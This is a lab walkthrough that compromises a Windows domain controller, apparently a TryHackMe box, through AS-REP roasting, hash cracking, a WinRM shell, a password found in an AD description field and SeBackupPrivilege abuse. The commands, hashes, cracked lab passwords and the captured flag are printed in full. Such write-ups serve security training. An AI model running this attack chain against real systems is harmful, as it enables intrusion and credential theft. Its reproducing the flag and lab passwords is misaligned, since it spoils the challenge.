## Recon

### Port scan 

```bash
sudo nmap -Pn -p- -sCV --min-rate 3000 -T 3 -oN fusionCorp-ports-scan 10.10.168.174
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 07:49 EAT
Nmap scan report for 10.10.168.174
Host is up (0.21s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: eBusiness Bootstrap Template
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-20 04:50:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-20T04:51:52+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Not valid before: 2025-10-19T04:45:18
|_Not valid after:  2026-04-20T04:45:18
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-20T04:51:13+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-20T04:51:13
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.04 seconds
```

We have port `80` open running `Microsoft IIS` version `10.0` 

Checking if the guest account is disabled.

```bash
nxc smb Fusion-DC.fusion.corp -u 'guest' -p ''                         
SMB         10.10.168.174   445    FUSION-DC        [*] Windows 10 / Server 2019 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:False) 
SMB         10.10.168.174   445    FUSION-DC        [-] fusion.corp\guest: STATUS_ACCOUNT_DISABLED 
```

Anonymous bind 

```bash
smbclient -L \\10.10.168.174\\
Password for [WORKGROUP\darklight]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.168.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```


```bash
enum4linux -a 10.10.168.174
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Oct 20 08:18:04 2025

 =========================================( Target Information )=========================================

Target ........... 10.10.168.174
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.10.168.174 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.10.168.174 )===============================

Looking up status of 10.10.168.174
No reply from 10.10.168.174

 ===================================( Session Check on 10.10.168.174 )===================================


[+] Server 10.10.168.174 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.168.174 )================================

Domain Name: FUSION
Domain Sid: S-1-5-21-1898838421-3672757654-990739655

[+] Host is part of a domain (not a workgroup)


 ==================================( OS information on 10.10.168.174 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.168.174 from srvinfo: 
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.10.168.174 )=======================================


[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED


 =================================( Share Enumeration on 10.10.168.174 )=================================

do_connect: Connection to 10.10.168.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.168.174


 ===========================( Password Policy Information for 10.10.168.174 )===========================


[E] Unexpected error from polenum:



[+] Attaching to 10.10.168.174 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.10.168.174)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient



 ======================================( Groups on 10.10.168.174 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.10.168.174 via RID cycling (RIDS: 500-550,1000-1050) )==================


[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.


 ===============================( Getting printer info for 10.10.168.174 )===============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Mon Oct 20 08:19:10 2025
```

`Timeroasting` failed.

```bash
python3 timecrack.py ../../computer_hashes.txt rockyou_utf8.txt

0 passwords recovered.
```

Running `vuln` script i get no exploits but  i get an interesting directory 

```bash
nmap --script vuln 10.10.168.174
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 08:36 EAT
Stats: 0:05:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.92% done; ETC: 08:41 (0:00:00 remaining)
Nmap scan report for fusion.corp (10.10.168.174)
Host is up (0.22s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /backup/: Possible backup
|   /css/: Potentially interesting folder
|   /img/: Potentially interesting folder
|   /js/: Potentially interesting folder
|_  /lib/: Potentially interesting folder
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=fusion.corp
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://fusion.corp:80/
|     Form id: name
|     Form action: 
|     
|     Path: http://fusion.corp:80/index.html
|     Form id: name
|     Form action: 
|     
|     Path: http://fusion.corp:80/blog.html
|     Form id: 
[SNIP]
```

![[Pasted_image_20251020092413.png]]

And we have a list of users 

![[Pasted_image_20251020092718.png]]

Testing valid users i get this 

```bash
kerbrute userenum --dc Fusion-DC.fusion.corp -d fusion.corp users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 10/20/25 - Ronnie Flathers @ropnop

2025/10/20 09:32:36 >  Using KDC(s):
2025/10/20 09:32:36 >  	Fusion-DC.fusion.corp:88

2025/10/20 09:32:36 >  [+] lparker has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$lparker@FUSION.CORP:a19f9fe00f325ac35e18910e99b2e950$2d64cc1ac91ec3756256427ddd834eb85f9adaa515fa050fd5d7157ca3175e665ba7ed014e511d67b4c0321caf825110ebb99310ae2b940d317720f165dcf7ae2b35beacd33602f5e2ec4a34f303222f4a8480cd5ab6f7e270101150762bbbd6e5852c8470e4c64aea409502502954dbf05d42bf90b44568d1cc94b2a79d74f7ef95dc7225155460f133f863b12f1fc483b5be66e9078fa353ed5db17df37dbec687187d27ea4486721bbfbdec3af5046f5694b8dfbd6a21f3992ef39a0c95c77b31dfece8e46aa2b64586a0fdc2d2d728cecc5a92f7d2628369f61141419b3eb6e182acf16129c857304181ae994b078a51e83bd04e8c44958a1f157715
2025/10/20 09:32:36 >  [+] VALID USERNAME:	 lparker@fusion.corp
2025/10/20 09:32:36 >  Done! Tested 10 usernames (1 valid) in 0.403 seconds
```

Attempting to crack the it fails

```bash
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$18$lparker@FUSION.CORP:a19f9fe00f325ac35...157715
Time.Started.....: Mon Oct 20 09:34:32 2025 (18 secs)
Time.Estimated...: Mon Oct 20 09:34:50 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   829.8 kH/s (4.50ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 65c Util: 90%

Started: Mon Oct 20 09:33:58 2025
Stopped: Mon Oct 20 09:34:51 2025
```

Checking at the mode we are using, `18200 (Kerberos 5, etype 23, AS-REP)` is for `etype 23` but our `AS-REP` is of `etype 18`, `$krb5asrep$18$` but `hashcat` does not have for 
`AS-REP etype 18`

Requesting another `AS-REP` using `inmpacket`


```bash
impacket-GetNPUsers fusion.corp/ -dc-ip 10.10.183.243 -usersfile valid_users.txt -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$lparker@FUSION.CORP:d9f28edaaca0da181cb574ef23a09613$a319da3cf74d517dfebf4b28aa6736a230f4815f7c33085a5d584d86fc08e62cb39583213c6e4a97194ce7687fb1093e259287bb38cfc15bd6a197be7127bb5ee2614b5b655bcbaf0e74648c3e7d3b40de16d98b989101ca8caae0f122a0f9d4e60709141647feb5121813beaeb5444ba89612e2210733bc892ad8d138be49f71eeb3c731aae49ac7ba8ef54a06b93ab449736afa6b5673c87f3c41706b54244f44978833f8a09f1bbe392b89ae4f80d61c43eb7925d26e0c6176dba95d21bcb69d83a36ab6acc87a70d20fb410700e17014fa2380d23ab7e6c8e3eeb53505a332902e39a3be3b844c00
```

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5asrep$23$lparker@FUSION.CORP:d9f28edaaca0da181cb574ef23a09613$a319da3cf74d517dfebf4b28aa6736a230f4815f7c33085a5d584d86fc08e62cb39583213c6e4a97194ce7687fb1093e259287bb38cfc15bd6a197be7127bb5ee2614b5b655bcbaf0e74648c3e7d3b40de16d98b989101ca8caae0f122a0f9d4e60709141647feb5121813beaeb5444ba89612e2210733bc892ad8d138be49f71eeb3c731aae49ac7ba8ef54a06b93ab449736afa6b5673c87f3c41706b54244f44978833f8a09f1bbe392b89ae4f80d61c43eb7925d26e0c6176dba95d21bcb69d83a36ab6acc87a70d20fb410700e17014fa2380d23ab7e6c8e3eeb53505a332902e39a3be3b844c00:!!abbylvzsvs2k6!
```


Credentials are valid

```bash
nxc smb Fusion-DC.fusion.corp -u 'lparker' -p '!!abbylvzsvs2k6!'
SMB         10.10.183.243   445    FUSION-DC        [*] Windows 10 / Server 2019 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:False)
SMB         10.10.183.243   445    FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6! 
```

we authenticate to the system using evil-winrm 

```bash
evil-winrm -i Fusion-DC.fusion.corp -u 'lparker' -p '!!abbylvzsvs2k6!'                                            
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\lparker\Documents> 
```


### Lateral-Movement
#### Getting AD users

```powershell
*Evil-WinRM* PS C:\Users\lparker\Desktop> net users /domain

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    jmurphy
krbtgt                   lparker
The command completed with one or more errors.
```

Getting writables


```bash
bloodyAD -d fusion.corp --host Fusion-DC.fusion.corp -u 'lparker' -p '!!abbylvzsvs2k6!' get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=fusion,DC=corp
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=Larry Parker,CN=Users,DC=fusion,DC=corp
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE

[SNIP]
```

Nothing interesting.

Getting account properties

```powershell
*Evil-WinRM* PS C:\Users\lparker\Desktop> Get-ADUser -Identity 'jmurphy' -Properties *


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
adminCount                           : 1
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : fusion.corp/Users/Joseph Murphy
Certificates                         : {}
City                                 :
CN                                   : Joseph Murphy
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 3/3/2021 5:41:24 AM
createTimeStamp                      : 3/3/2021 5:41:24 AM
Deleted                              :
Department                           :
Description                          : Password set to u8WC3!kLsgw=#bRY
DisplayName                          : Joseph Murphy
DistinguishedName                    : CN=Joseph Murphy,CN=Users,DC=fusion,DC=corp

[SNIP]
```

We have the password for `jmurphy` in the description attribute.

```bash
*Evil-WinRM* PS C:\Users\jmurphy\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```


https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

```powershell
*Evil-WinRM* PS C:\> robocopy C:\users\administrator\desktop C:\temp flag.txt /B

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, October 20, 2025 12:46:12 AM
   Source : C:\users\administrator\desktop\
     Dest : C:\temp\

    Files : flag.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                   1	C:\users\administrator\desktop\
	    New File  		      37	flag.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        37        37         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Monday, October 20, 2025 12:46:12 AM

*Evil-WinRM* PS C:\> dir temp


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2021   6:05 AM             37 flag.txt


*Evil-WinRM* PS C:\> type temp\flag.txt
THM{f72988e57bfc1deeebf2115e10464d15}
```

`3hrs`

